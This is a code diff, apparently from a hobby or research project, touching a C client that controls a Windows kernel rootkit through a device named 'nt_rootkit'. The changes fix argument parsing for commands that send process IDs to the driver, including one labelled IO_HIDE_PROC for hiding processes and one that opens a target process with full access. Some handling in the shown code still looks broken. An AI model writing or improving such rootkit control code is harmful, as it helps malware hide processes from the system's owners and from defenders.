@@ -7,7 +7,7 @@ int main(int argc, char* argv[], char* envp[])
         BOOL status = FALSE;
         HANDLE device = INVALID_HANDLE_VALUE;
         DWORD ret_bytes = 0;
-        UINT32 input_buf[128] = {0};
+        CHAR input_buf[128] = {0};
         CHAR output_buf[128] = {0};
 
         device = CreateFileW(L"\\\\.\\nt_rootkit",
@@ -20,8 +20,8 @@ int main(int argc, char* argv[], char* envp[])
                         if (atoi(argv[2]) > 0) {
                                 printf("sending command to hide %d...\n",
                                         atoi(argv[2]));
-                                RtlCopyMemory(input_buf, atoi(argv[2]),
-                                              atoi(argv[2]));
+                                RtlCopyMemory(input_buf, argv[2],
+                                              strlen(argv[2]));
                                 status = DeviceIoControl(
                                         device, IO_HIDE_PROC,
                                         input_buf, sizeof(input_buf), 
@@ -31,7 +31,7 @@ int main(int argc, char* argv[], char* envp[])
                         }
                         break;
                 case 'b':
-                        if ((int)*argv[2] > 0) {
+                        if (atoi(argv[2]) > 0) {
                                 RtlCopyMemory(input_buf, argv[2],
                                         strlen(argv[2]));
                                 status = DeviceIoControl(
@@ -42,7 +42,7 @@ int main(int argc, char* argv[], char* envp[])
                         }
                         break;
                 case 'c':
-                        if ((int)*argv[2] > 0) {
+                        if (atoi(argv[2]) > 0) {
                                 HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS,
                                         FALSE, *argv[2]);
                                 RtlCopyMemory(input_buf, proc,
